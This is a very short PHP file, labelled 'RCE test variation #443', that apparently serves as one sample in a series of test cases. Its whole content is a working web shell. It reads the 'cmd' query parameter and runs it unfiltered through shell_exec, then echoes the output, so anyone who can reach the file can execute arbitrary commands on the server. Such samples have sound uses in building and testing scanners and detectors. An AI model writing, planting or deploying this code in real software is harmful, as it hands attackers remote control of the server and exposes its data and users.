<?php
// RCE test variation #443
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>